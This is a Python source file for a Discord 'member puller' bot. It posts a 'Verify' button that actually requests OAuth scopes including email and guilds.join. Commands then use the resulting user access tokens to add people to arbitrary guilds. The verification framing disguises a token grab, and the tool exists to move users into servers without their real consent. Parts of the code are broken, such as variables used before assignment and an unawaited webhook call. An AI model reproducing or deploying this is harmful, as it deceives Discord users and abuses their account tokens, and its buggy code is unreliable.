import discord, json, requests, os
from pystyle import *
from discord import *
from discord.ui import *
from discord.ext import commands, tasks


def pull_to_guild(bot_token, token, guild_id, id):
    
    data = {
        "access_token" : token
    }
    headers = {
        "Authorization" : f"Bot {bot_token}",
        'Content-Type': 'application/json'

    }
    r = requests.put(f'https://discord.com/api/v8/guilds/{guild_id}/members/{id}', headers=headers, json=data).json()
    return r

os.system('cls')
with open("saved.json", "r+") as a:
    print("[...] Checking for tokens")
    aa = json.load(a)
    if aa['config']['bot_token'] == "":
        token = input(f"{Colors.light_blue}[>] {Colors.blue}Bot token: ")

    else:
        token = aa['config']['bot_token']

bot = commands.Bot(command_prefix="-", help_command=None, intents=discord.Intents.all())

@bot.command()
async def pull(ctx, token2, guild_id, uid):
    try:
        a = pull_to_guild(token, token2, guild_id, uid)

        await ctx.send(embed=Embed(title="Pulled user", description=f"Sucessfully added the user to the guild!"))
    except:
        await ctx.send(embed=Embed(title="Failed to pull user", description=f"This didn't seem to work :(!"))
@bot.command()
async def pull_all(ctx, token2, guild_id, uid):
    try:
        with open("saved.json", "r+") as x:
            xx = json.load(x)
            for p in xx:
                a = pull_to_guild(token, token2, guild_id, p)

        await ctx.send(embed=Embed(title="Pulled user", description=f"Sucessfully added the user to the guild!"))
    except:
        await ctx.send(embed=Embed(title="Failed to pull user", description=f"This didn't seem to work :(!"))



@bot.command()
async def setup(ctx, channel:int = None):
    if channel == None:
        button = Button(
            style=ButtonStyle.link,
            label="Verify",
            url="https://discord.com/api/oauth2/authorize?client_id=1073913811507093566&redirect_uri=http://localhost:8080/callback&response_type=code&scope=identify%20guilds%20email%20guilds.join"
        )
        guild = ctx.message.guild
        a = await guild.create_text_channel("Verify")
        await a.set_permissions(guild.default_role, view_channel=False)
        b = await guild.create_text_channel("Log")
        await b.set_permissions(guild.default_role, view_channel=False)

        b1 = b.id
        vie = View()
        vie.add_item(button)
        with open("saved.json", "r+") as f:
            ff = json.load(f)
            b = await b.create_webhook(name="GoAuth")
            print(b)
            ff['log'] = b.url
            ff['config'] = {
            
            "guild":guild.id,
            "bot_token":token
            
            }
            print(b.url)
            f.truncate(0)
            f.seek(0)
            json.dump(ff, f, indent=4)
        await a.send(embed=Embed(title="Verify", description="Click the button below to verify in this server!"), view=vie)
    else:
        a = channel
        button = Button(
            style=ButtonStyle.link,
            label="Verify",
            url="https://discord.com/api/oauth2/authorize?client_id=1073913811507093566&redirect_uri=http://localhost:8080/callback&response_type=code&scope=identify%20guilds%20email%20guilds.join"
        )
        b = await guild.create_text_channel("Log")
        guild = ctx.message.guild
        
        with open("saved.json", "r+") as f:
            ff = json.load(f)
            b = b.create_webhook(name="GoAuth")
            print(b.url)

            ff['config'] = {
            
            "guild":guild.id,
            "bot_token":token
            
            }
            print(b)
            f.truncate(0)
            f.seek(0)
            json.dump(ff, f, indent=4)
        vie = View()
        vie.add_item(button)
        await a.send(embed=Embed(title="Verify", description="Click the button below to verify in this server!"), view=vie)
    await ctx.reply(embed=Embed(title=f"Created", description=f"Sucessfully set up verification in <#{a.id}>! All logs will be sent to <#{b1}>"))
bot.run(token)
